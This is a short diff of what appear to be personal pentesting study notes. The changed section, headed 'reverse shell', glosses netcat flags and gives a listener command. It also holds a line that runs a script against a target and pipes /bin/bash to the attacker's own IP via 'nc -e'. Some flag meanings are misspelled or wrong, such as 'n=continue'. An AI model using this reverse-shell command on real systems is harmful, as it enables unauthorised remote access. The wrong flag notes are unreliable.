@@ -21,20 +21,20 @@ command binding> -sV + -sC = -sVC
 
 ]
  >reverse shell
-
-nc=netcat
-l=lison
+        <------
+nc=netcat      :
+l=lison        :
 v=verbose       _ _ _ _ _
-n=continue     |         |
-p=port         |         | 
-                         |
+n=continue     :         |
+p=port         :         | 
+        <------          |
                    ______|______
                    |           |
                      nc -lvnp <port 9001>
                     python <script> <ip> nc <own ip> <port> -e /bin/bash
 
 
-
+                                  
 
 reverse shell cheatsheet
 
